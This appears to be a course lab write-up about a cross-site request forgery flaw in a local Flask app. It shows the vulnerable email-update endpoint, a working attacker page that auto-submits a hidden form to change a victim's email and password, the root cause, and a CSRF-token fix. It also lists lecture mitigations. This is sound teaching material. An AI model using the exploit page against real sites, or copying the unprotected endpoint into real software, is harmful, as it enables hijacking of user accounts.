(a) Vulnerable Implementation

Located in app.py within function csrf_update_email():

# Endpoint processes state-changing POST relying solely on session cookie new_email = request.form.get("email") cursor.execute("UPDATE users SET email = ? WHERE username = ?", (new_email, username)) conn.commit()
(b) Working Exploit Payload (Attacker Page)

External hostile webpage (templates/attacker/csrf_exploit.html):

<form action="http://localhost:5000/csrf-post/update" method="POST" id="csrfForm"> <input type="hidden" name="email" value="attacker_sarvansh@hacker.io"> <input type="hidden" name="new_password" value="hackedPassword2026!"> </form> <script> // Automatically submits as soon as victim opens the page! document.getElementById('csrfForm').submit(); </script>

How it works: The browser automatically attaches the victim's session cookie when making the cross-origin POST request. Without a CSRF token, the server cannot tell if the request was initiated intentionally by the user or forged by the attacker's script.

(c) Root Cause

State-changing request accepted without proof of user intent: Web browsers inherently include ambient authentication credentials (cookies) with cross-site requests. Without an anti-CSRF token or SameSite cookie restrictions, the server mistakes a forged cross-site request for a legitimate user action.

(d) Mitigation Implemented

Synchronizer Token Pattern: The server generates a cryptographically random, unpredictable token per session. Form submissions must return this token. The attacker cannot read the token due to the Same-Origin Policy (SOP).

session_token = session.get("csrf_token") submitted_token = request.form.get("csrf_token") if not submitted_token or not secrets.compare_digest(submitted_token, session_token): return "CSRF Attack Blocked: Invalid Token", 403
(e) Other Mitigations from Lecture (Theory)
  • SameSite Cookie Attribute: Setting SameSite=Strict or SameSite=Lax instructs browsers not to send session cookies on cross-site requests.
  • Re-authentication for sensitive actions: Requiring the user to enter their current password or 2FA OTP before executing critical state modifications (email, password, or balance changes).
  • Avoiding state-changing GET requests: Ensuring GET methods are strictly idempotent and safe, preventing trivial image/link tag exploitation.
  • Custom Request Headers: Verifying custom headers (e.g. X-Requested-With) in AJAX requests combined with CORS controls.
